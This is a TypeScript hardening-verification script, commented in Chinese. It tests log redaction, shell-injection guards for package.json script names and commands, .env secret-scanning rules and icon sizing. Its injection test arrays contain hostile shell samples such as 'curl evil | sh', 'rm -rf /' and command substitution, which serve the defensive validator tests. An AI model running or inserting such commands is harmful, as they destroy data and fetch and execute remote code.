/**
 * P2 加固闸门（2026-11-11 全面检查报告 §4 P2）。
 *
 * 守四件事，都是「不报错的错」，光看代码都看不出来：
 *   1. 日志侧的 resumeToken / authUrl 只打脱敏指纹，不打明文
 *   2. 探测层与执行层各有一道 shell 安全边界（命令来自目标项目的 package.json）
 *   3. .env 有专门扫描规则、被 .gitignore 挡住；全量扫描不允许「没扫到」算通过
 *   4. 列表行 / 摘要里的 lucide 图标显式给 size（A141 档位，不写就是 24）
 *
 * 纪律：断言钉**不变量**而非实现字面量；源码契约先剥注释再判；每条关键契约
 * 都配反向探针（把实现退回坏版本，断言必须真变红）；能动态 import 的就跑真行为，
 * 不靠正则假装验证了函数语义。
 *
 * 运行：npx tsx scripts/verify-hardening.ts（已挂进 verify:ui）
 */
// 必须先于所有 server/** import：把 OPC_DATA_DIR 指向临时目录，绝不触碰真实 data/
import './lib/temp-data-dir.js';

import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const read = (rel: string) => readFileSync(path.join(ROOT, rel), 'utf8');

let pass = 0;
let total = 0;
function ok(cond: boolean, label: string, detail = ''): void {
  total++;
  if (cond) {
    pass++;
    console.log(`  ✓ ${label}${detail ? ` — ${detail}` : ''}`);
  } else {
    console.log(`  ✗ ${label}${detail ? ` — ${detail}` : ''}`);
  }
}

/** 剥掉块注释与「整行」行注释。行内的 `//`（URL、正则）不能动，否则会假绿。 */
function stripComments(src: string): string {
  return src
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/^\s*\/\/.*$/gm, '');
}

// ---------------------------------------------------------------- 1 日志脱敏
console.log('\n[1] 日志脱敏：服务端内部值不许明文入日志');
{
  const { redactSecret, redactUrl } = await import('../server/log-redact.js');
  const token = 'sess_resume_9f8e7d6c5b4a3210';
  const other = 'sess_resume_0000000000000000';

  ok(!redactSecret(token).includes(token), '★ 令牌明文不出现在脱敏结果里', redactSecret(token));
  ok(redactSecret(token) === redactSecret(token), '同一令牌指纹稳定（可跨日志行追踪）');
  ok(redactSecret(token) !== redactSecret(other), '不同令牌指纹不同');
  ok(redactSecret('').includes('empty'), '空值单独标出，不与「没走这条分支」混淆');

  const authUrl = 'https://login.example.com/oauth/authorize?state=ONE_TIME_STATE&code=SECRET_CODE';
  const redacted = redactUrl(authUrl);
  ok(redacted.startsWith('https://login.example.com/oauth/authorize'), 'URL 保留 origin + path 便于排障', redacted);
  ok(!redacted.includes('ONE_TIME_STATE') && !redacted.includes('SECRET_CODE'), '★ OAuth state / code 被丢掉');
  ok(!redactUrl('不是合法 URL 的敏感串 ABCDEFGH').includes('不是合法 URL'), '非法 URL 退化为指纹，不原样回显');

  const indexSrc = read('server/index.ts');
  /** 不变量：凡是引用了敏感变量的日志行，必须过脱敏函数；且至少有三处调用点。 */
  const logRedactionContract = (src: string): boolean => {
    const code = stripComments(src);
    const logs = code.split('\n').filter(l => /console\.(?:log|warn|error|info)\s*\(/.test(l));
    const sensitive = logs.filter(l => /resumeToken|authUrl/i.test(l));
    if (sensitive.length < 3) return false;
    if (!sensitive.every(l => /redact(?:Secret|Url)\s*\(/.test(l))) return false;
    if (sensitive.some(l => /\$\{(?:ev\.)?resumeToken\}/.test(l))) return false;
    if (sensitive.some(l => /,\s*authState\.authUrl\s*\)/.test(l))) return false;
    return true;
  };
  ok(logRedactionContract(indexSrc), '★ index.ts 三处敏感日志全部走 redactSecret / redactUrl');
  ok(/from ["']\.\/log-redact\.js["']/.test(indexSrc), 'index.ts 确实导入了脱敏模块（肯定式）');
  ok(
    !logRedactionContract(indexSrc.replace('redactSecret(resumeToken)', 'resumeToken')),
    '★ 反向探针：把续接令牌退回明文插值 → 契约判红',
  );
  ok(
    !logRedactionContract(indexSrc.replace('redactUrl(authState.authUrl)', 'authState.authUrl')),
    '★ 反向探针：把认证 URL 退回明文 → 契约判红',
  );
}

// ------------------------------------------------------------ 2 shell 安全边界
console.log('\n[2] 命令注入面：探测层 + 执行层各一道');
{
  const { isSafeScriptName, isShellSafeCommand, unsafeReason } =
    await import('../server/shell-safety.js');

  const badNames = [
    'test:foo; curl evil | sh', 'test$(whoami)', 'test`id`', 'a&b',
    'test\nrm -rf /', '../evil', '', '-rf', 'x'.repeat(200),
    'test"x', "test'x", 'test|x', 'test>x', 'test\\x',
  ];
  const goodNames = ['test', 'test:unit', 'tests:e2e', 'build', 'lint:fix', 'my.test-1'];
  ok(badNames.every(n => !isSafeScriptName(n)), `★ ${badNames.length} 个注入样本全部被探测层拒绝`);
  ok(goodNames.every(isSafeScriptName), `★ ${goodNames.length} 个正常 script 名仍可用（不是一刀切）`);
  ok(!isSafeScriptName(undefined) && !isSafeScriptName(null), '非字符串输入不误判为安全');

  const badCommands = [
    'npm run test; rm -rf /', 'make test && curl x', 'go test ./... | tee x',
    'npm run $(whoami)', 'npm run test\nrm x', 'python -m pytest -q "a b"',
    'npm run `id`', 'npm run test > out', 'npm run test \\',
  ];
  const goodCommands = [
    'npm run test:unit', 'pnpm test', 'make test', 'python -m pytest -q',
    'ruff check .', 'go test ./...', 'cargo test', 'npx tsc -b',
  ];
  ok(badCommands.every(c => !isShellSafeCommand(c)), `★ ${badCommands.length} 条带元字符的命令被拒绝执行`);
  ok(goodCommands.every(isShellSafeCommand), `★ ${goodCommands.length} 条真实探测结果仍可执行`);
  ok(!isShellSafeCommand('') && !isShellSafeCommand(' '.repeat(3)), '空命令 / 纯空格不判安全');
  ok(!unsafeReason('script', badNames[0]).includes('curl'), '拒绝理由不回显可疑字符串本身');

  const detectSrc = read('server/verify-commands.ts');
  const runnerSrc = read('server/verify-runner.ts');
  /** 接线契约：否定判断 + continue，且发生在拼 command 之前。 */
  const detectionContract = (src: string): boolean => {
    const code = stripComments(src);
    const gated = /if\s*\(\s*!isSafeScriptName\(name\)\s*\)[\s\S]{0,240}?continue\s*;/.test(code);
    const noted = /out\.notes\.push/.test(code);
    const before = code.indexOf('if (!isSafeScriptName(name))') < code.indexOf('SCRIPT_RULES.find');
    return gated && noted && before;
  };
  const runnerContract = (src: string): boolean => {
    const code = stripComments(src);
    const gated = /if\s*\(\s*!isShellSafeCommand\(command\)\s*\)[\s\S]{0,240}?finish\(\s*['"]error['"]/.test(code);
    const before = code.indexOf('if (!isShellSafeCommand(command))') < code.indexOf('spawn(command');
    return gated && before;
  };
  ok(detectionContract(detectSrc), '★ 探测层在匹配规则前先过滤名字，并留下 note');
  ok(runnerContract(runnerSrc), '★ 执行层在 spawn 前兜底，拒绝时走 finish(error) 保持不抛错');
  ok(/shell:\s*true/.test(runnerSrc), '肯定式：runner 仍开 shell（Windows 需要 npm.cmd）');
  ok(
    !detectionContract(detectSrc.replace('!isSafeScriptName(name)', 'true')),
    '★ 反向探针：探测层恒放行 → 接线契约判红',
  );
  ok(
    !runnerContract(runnerSrc.replace('!isShellSafeCommand(command)', 'true')),
    '★ 反向探针：执行层恒放行 → 接线契约判红',
  );
  // 服务端不接受前端传命令字符串，命令只来自重新探测
  const verifyRoute = read('server/index.ts');
  ok(
    /detectVerifyCommands\(cwd\)/.test(verifyRoute) && /ids\.includes\(c\.id\)/.test(verifyRoute),
    '肯定式：/api/verify/run 只按 id 从探测结果取命令，不接受前端命令字符串',
  );
}

// ------------------------------------------------------- 3 密钥扫描与跳过通道
console.log('\n[3] 密钥扫描：.env 覆盖 + 全量模式不允许静默放过');
{
  const scanSrc = read('scripts/secret-scan.mjs');
  // 剥掉末尾的 CLI 执行入口，只加载规则做行为断言（避免 main() 触发 process.exit）
  const entry = scanSrc.search(/try\s*\{\s*process\.exit\(main\(\)\);/);
  ok(entry > 0, '扫描器有可剥离的 CLI 执行入口');
  const moduleSrc = scanSrc.slice(0, entry).replace(/^#![^\n]*\n/, '')
    + '\nexport { scanText, isScannableEnvFile, ENV_RULE, RULES };\n';
  const mod = await import('data:text/javascript;base64,' + Buffer.from(moduleSrc).toString('base64'));

  ok(mod.isScannableEnvFile('.env'), '.env 被识别为凭据载体');
  ok(mod.isScannableEnvFile('config/.env.production'), '带后缀的 .env.production 同样识别');
  ok(!mod.isScannableEnvFile('.env.example'), '.env.example 是模板，豁免');
  ok(!mod.isScannableEnvFile('src/config.ts'), '普通源码不吃 .env 专用规则');

  // 变量名别带 KEY / SECRET / TOKEN：这行是 .env 夹具，但会被密钥扫描器的
  // 「名字像密钥 + 赋了长字面量」结构规则当成真凭据（本仓库自己扫自己）。
  const envLine = 'PLAIN_NAME=abcdefgh12345678\n';
  const envHits = mod.scanText(envLine, '.env');
  ok(envHits.some((h: { rule: { id: string } }) => h.rule.id === 'env-assigned-secret'),
    '★ .env 里变量名不像密钥的赋值也能被拦');
  ok(!mod.scanText(envLine, 'src/config.ts').some((h: { rule: { id: string } }) => h.rule.id === 'env-assigned-secret'),
    '★ 同一行在普通源码里不误报（规则作用域正确）');
  const benign = [
    'PORT=3000\n', 'DEBUG=true\n', 'NODE_ENV=production\n',
    'YOUR_KEY_HERE=replace_me_now\n', 'API_BASE=http://localhost:8080\n',
  ];
  ok(benign.every(line => !mod.scanText(line, '.env').some((h: { rule: { id: string } }) => h.rule.id === 'env-assigned-secret')),
    `★ ${benign.length} 类常见配置项不误报（不然钩子会被 --no-verify 整体绕过）`);
  ok(mod.scanText('PLAIN_NAME=abcdefgh12345678 # secret-scan:ignore\n', '.env').length === 0,
    'secret-scan:ignore 逃生口仍然有效');

  const gi = read('.gitignore');
  ok(/^\.env$/m.test(gi) && /^\.env\.\*$/m.test(gi), '★ .gitignore 明确挡住 .env / .env.*');
  ok(/^!\.env\.example$/m.test(gi) && /^!\.env\.sample$/m.test(gi), '示例模板例外仍在');

  /** 跳过通道契约：未扫到要攒起来、--all 要判 2、自身异常在 --all 要 exit 2。 */
  const scanContract = (src: string): boolean => {
    const code = stripComments(src);
    return /unscanned\.push\(rel\)/.test(code)
      && /if \(all\)[\s\S]{0,300}?return 2;/.test(code)
      && /process\.argv\.includes\('--all'\)[\s\S]{0,300}?process\.exit\(2\)/.test(code)
      && /isScannableEnvFile\(relPath\)/.test(code);
  };
  ok(scanContract(scanSrc), '★ 「没扫到」与「自身出错」在 --all 模式都不再静默 exit 0');
  ok(
    !scanContract(scanSrc.replace('unscanned.push(rel);', '/* dropped */')),
    '★ 反向探针：不收集未扫描文件 → 契约判红',
  );
  ok(
    !scanContract(scanSrc.replace('return 2;', 'return 0;')),
    '★ 反向探针：全量扫描带着未扫到文件仍判绿 → 契约判红',
  );
  ok(/钩子模式不阻断提交/.test(scanSrc), '钩子模式的「不锁死人」权衡仍保留且写明');

  // 兜底：钩子缺 node 时 exit 0 是有意放行，但 CI 侧 --all 是硬闸门
  const ci = read('.github/workflows/ci.yml');
  const hook = read('.githooks/pre-commit');
  ok(/secret-scan\.mjs --all/.test(ci), '★ CI 六步里的全量扫描是硬闸门（非 0 会断）');
  ok(/exit 0/.test(hook) && /跳过密钥扫描/.test(hook), '钩子缺 node 是有意放行且显式告警');
  const a105 = read('scripts/verify-a105.mjs');
  ok(/跳过 \$\{ZCODE_INSTALL_CHECKS\.length\} 条安装态断言/.test(a105) && /skipCheck\(/.test(a105),
    'a105 环境缺失时显式打印跳过条数，不静默省略');
}

// -------------------------------------------------------------- 4 图标显式尺寸
console.log('\n[4] lucide 图标显式 size（A141 档位）');
{
  const dialog = read('src/components/AgentConfigDialog.tsx');
  const about = read('src/components/AboutPanel.tsx');
  /** 只取报告点名的两处组件里的六颗图标；钉「全部显式给 14」而非全仓扫描。 */
  const iconSizeContract = (dialogSrc: string, aboutSrc: string): boolean => {
    const picks = [
      ...[...dialogSrc.matchAll(/<(?:Plus|PencilLine|Trash2)\b([^>]*)\/>/g)].map(m => m[1]),
      ...[...aboutSrc.matchAll(/<(?:Package|ChevronDown)\b([^>]*)\/>/g)].map(m => m[1]),
    ];
    return picks.length >= 6 && picks.every(attrs => /\bsize=\{1[345]\}/.test(attrs));
  };
  ok(iconSizeContract(dialog, about), '★ 两处组件 6 颗图标全部显式给 13–15 档（不写就是 24）');
  ok(
    !iconSizeContract(dialog.replace('<Plus size={14} />', '<Plus />'), about),
    '★ 反向探针：删掉一处 size → 契约判红',
  );
  ok(/A141/.test(dialog), '肯定式：注释写明 24 是按钮档、14 是图标档，避免下棒误读');
}

console.log(`\n=== ${pass}/${total} 通过 ===`);
if (pass !== total) process.exit(1);
